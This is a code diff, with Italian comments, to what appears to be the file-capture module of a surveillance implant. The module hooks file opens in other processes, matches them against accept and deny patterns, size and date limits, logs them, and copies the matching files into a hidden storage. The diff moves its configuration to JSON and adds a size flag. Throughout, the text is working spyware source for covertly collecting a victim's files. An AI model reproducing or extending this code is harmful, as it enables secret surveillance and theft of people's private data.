@@ -12,21 +12,6 @@ typedef struct {
 } pattern_list_struct;
 pattern_list_struct pattern_list;
 
-// Struttura usata nel file di configurazione 
-// per i pattern di cattura file
-typedef struct {
-	DWORD min_fsize;
-	DWORD max_fsize;
-	DWORD hi_mindate;
-	DWORD lo_mindate;
-	DWORD reserved1;
-	DWORD reserved2;
-	BOOL  no_file_open;
-	DWORD accept_count;
-	DWORD deny_count;
-	WCHAR pattern_list[1];                  
-} pattern_configuration;
-
 typedef DWORD (__stdcall *GetCurrentProcessId_t)(void);
 typedef struct {
 	COMMONDATA;
@@ -41,7 +26,7 @@ typedef struct {
 } IPCCreateFileStruct;
 
 BOOL bPM_FileAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
-DWORD min_fsize, max_fsize; // Dimensione minima e massima di un file che puo' essere catturato 
+DWORD min_fsize = 0, max_fsize = 0; // Dimensione minima e massima di un file che puo' essere catturato 
 BOOL log_file_open = TRUE;
 nanosec_time min_date; // Data minima di un file che puo' essere catturato
 
@@ -266,20 +251,10 @@ BOOL IsFixedDrive(char *path)
 }
 
 // Popola la lista di pattern da includere/escludere
-void PopulatePatternList(pattern_configuration *conf_list)
+void PopulatePatternList(JSONObject conf_list)
 {
 	DWORD i;
-	WCHAR *pattern_ptr_w;
-
-	// Se il parametro passato e' nullo, definisce
-	// la configurazione di default (inizializzazione)
-	if (!conf_list) {
-		pattern_list.accept_count = 0;
-		pattern_list.deny_count = 0;
-		pattern_list.accept_list = NULL;
-		pattern_list.deny_list = NULL;
-		return;
-	}
+	JSONArray accept, deny;
 
 	// Libera una precedente lista (se presente)
 	for (i=0; i<pattern_list.accept_count; i++)
@@ -292,43 +267,34 @@ void PopulatePatternList(pattern_configuration *conf_list)
 	SAFE_FREE(pattern_list.deny_list);
 	pattern_list.deny_count = 0;
 
-	// Verifica che sia una configurazione valida
-	if (conf_list->reserved1!=0 || conf_list->reserved2!=0)
-		return;
-
-	if (conf_list->no_file_open)
-		log_file_open = FALSE;
-	else
-		log_file_open = TRUE;
+	// Vede se deve loggare i file open
+	log_file_open = (BOOL) conf_list[L"open"]->AsBool();
+	accept = conf_list[L"accept"]->AsArray();
+	deny = conf_list[L"deny"]->AsArray();
 
 	// Alloca le due liste
-	if (conf_list->accept_count) {
-		pattern_list.accept_list = (WCHAR **)malloc(conf_list->accept_count * sizeof(WCHAR *));
+	if (accept.size() > 0) {
+		pattern_list.accept_list = (WCHAR **)malloc(accept.size() * sizeof(WCHAR *));
 		if (!pattern_list.accept_list)
 			return;
 	}
 
-	if (conf_list->deny_count) {
-		pattern_list.deny_list = (WCHAR **)malloc(conf_list->deny_count * sizeof(WCHAR *));
+	if (deny.size() > 0) {
+		pattern_list.deny_list = (WCHAR **)malloc(deny.size() * sizeof(WCHAR *));
 		if (!pattern_list.deny_list) {
 			SAFE_FREE(pattern_list.accept_list);
 			return;
 		}
 	}
 
-	pattern_list.accept_count = conf_list->accept_count;
-	pattern_list.deny_count = conf_list->deny_count;
+	pattern_list.accept_count = accept.size();
+	pattern_list.deny_count = deny.size();
 
 	// ...e parsa tutte le stirnghe unicode
-	pattern_ptr_w = conf_list->pattern_list;
-	for (i=0; i<pattern_list.accept_count; i++) {
-		pattern_list.accept_list[i] = wcsdup(pattern_ptr_w);
-		pattern_ptr_w += (wcslen(pattern_ptr_w) + 1);
-	}
-	for (i=0; i<pattern_list.deny_count; i++) {
-		pattern_list.deny_list[i] = wcsdup(pattern_ptr_w);
-		pattern_ptr_w += (wcslen(pattern_ptr_w) + 1);
-	}
+	for (i=0; i<pattern_list.accept_count; i++) 
+		pattern_list.accept_list[i] = wcsdup(accept[i]->AsString().c_str());
+	for (i=0; i<pattern_list.deny_count; i++) 
+		pattern_list.deny_list[i] = wcsdup(deny[i]->AsString().c_str());
 }
 
 // Compara due stringhe con wildcard
@@ -408,7 +374,7 @@ int CmpWildW(WCHAR *wild, WCHAR *string)
 
 // Verifica le condizioni per la copia del file
 // nello storage.
-BOOL IsToCopy(WCHAR *file_name)
+BOOL IsToCopy(WCHAR *file_name, BOOL *exceed_size)
 {
 	HANDLE hfile;
 	BY_HANDLE_FILE_INFORMATION file_info;
@@ -430,7 +396,9 @@ BOOL IsToCopy(WCHAR *file_name)
 	
 	// Check sui vincoli di dimensione
 	if (file_info.nFileSizeHigh>0 || file_info.nFileSizeLow<min_fsize || file_info.nFileSizeLow>=max_fsize)
-		return FALSE;
+		*exceed_size = TRUE;
+	else 
+		*exceed_size = FALSE;
 
 	// Check sul vincolo della data
 	file_date.hi_delay = file_info.ftLastWriteTime.dwHighDateTime;
@@ -508,28 +476,6 @@ BOOL IsToLog(WCHAR *file_name, WCHAR *proc_name)
 	return TRUE;
 }
 
-/*char *GetAsciiPathName(WCHAR *orig_path) 
-{
-	char *dest_a_path;
-	DWORD mblen;
-	BOOL is_not_mapped;
-
-	if ( (mblen = FNC(WideCharToMultiByte)(CP_ACP, 0, orig_path, -1, NULL, 0, NULL, &is_not_mapped)) == 0 )
-		return NULL;
-	
-	if (is_not_mapped)
-		return GetDosAsciiName(orig_path);
-
-	if ( !(dest_a_path = (char *)malloc(mblen)) )
-		return NULL;
-
-	if ( FNC(WideCharToMultiByte)(CP_ACP, 0, orig_path, -1, (LPSTR)dest_a_path, mblen, NULL, NULL) == 0 ) {
-		free(dest_a_path);
-		return NULL;
-	}
-	return dest_a_path;
-}*/
-
 #define READ_MODE   0x80000000
 #define WRITE_MODE  0x40000000
 #define EXEC_MODE   0x20000000
@@ -540,6 +486,7 @@ DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FIL
 	DWORD hi_dim = 0, lo_dim = 0, ops;
 	WCHAR *proc_name_to_compare;
 	char *proc_name;
+	BOOL exceed_size = FALSE;
 	WCHAR *utf16_file_name;
 
 	utf16_file_name = (WCHAR *)((IPCCreateFileStruct *) msg)->szFileName;
@@ -584,8 +531,8 @@ DWORD __stdcall PM_FileAgentDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FIL
 		}
 
 		// Vede se deve copiare tutto il file nello storage
-		if (IsToCopy(utf16_file_name)) 
-			Log_CopyFile(utf16_file_name, NULL, PM_FILEAGENT_CAPTURE);
+		if (IsToCopy(utf16_file_name, &exceed_size)) 
+			Log_CopyFile(utf16_file_name, NULL, exceed_size, PM_FILEAGENT_CAPTURE);
 	}
 	SAFE_FREE(proc_name_to_compare);
 	return 1;
@@ -623,38 +570,31 @@ DWORD __stdcall PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_FileAgentInit(BYTE *conf_ptr, BOOL bStartFlag)
+DWORD __stdcall PM_FileAgentInit(JSONObject elem)
 {
-	pattern_configuration *fagent_conf = (pattern_configuration *)conf_ptr;
+	FILETIME ftime;
 
-	// Se il parametro passato e' nullo, definisce
-	// la configurazione di default (inizializzazione)
-	PopulatePatternList(fagent_conf);
+	PopulatePatternList(elem);
 
-	// Se non e' configurato non logga niente (max_fsize=0 e accept pattern list vuota)
-	if (fagent_conf) {
-		min_fsize = fagent_conf->min_fsize;
-		max_fsize = fagent_conf->max_fsize;
-		min_date.hi_delay = fagent_conf->hi_mindate;
-		min_date.lo_delay = fagent_conf->lo_mindate;
+	if ((BOOL)elem[L"capture"]->AsBool()) {
+		min_fsize = (DWORD) elem[L"minsize"]->AsNumber();
+		max_fsize = (DWORD) elem[L"maxsize"]->AsNumber();
+		HM_TimeStringToFileTime(elem[L"date"]->AsString().c_str(), &ftime); 
+		min_date.hi_delay = ftime.dwHighDateTime;
+		min_date.lo_delay = ftime.dwLowDateTime;
+
 	} else {
-		min_fsize = 0;
-		max_fsize = 0;
-		min_date.hi_delay = 0;
-		min_date.lo_delay = 0;
+		min_fsize = max_fsize = 0;
+		HM_TimeStringToFileTime(L"2100-01-01 00:00:00", &ftime); 
+		min_date.hi_delay = ftime.dwHighDateTime;
+		min_date.lo_delay = ftime.dwLowDateTime;		
 	}
 
-	PM_FileAgentStartStop(bStartFlag, TRUE);
 	return 1;
 }
 
 
 void PM_FileAgentRegister()
 {
-	// L'hook viene registrato dalla funzione HM_InbundleHooks
-	AM_MonitorRegister(PM_FILEAGENT, (BYTE *)PM_FileAgentDispatch, (BYTE *)PM_FileAgentStartStop, (BYTE *)PM_FileAgentInit, NULL);
-
-	// Inizialmente i monitor devono avere una configurazione di default nel caso
-	// non siano referenziati nel file di configurazione (partono comunque come stoppati).
-	PM_FileAgentInit(NULL, FALSE);
+	AM_MonitorRegister(L"file", PM_FILEAGENT, (BYTE *)PM_FileAgentDispatch, (BYTE *)PM_FileAgentStartStop, (BYTE *)PM_FileAgentInit, NULL);
 }
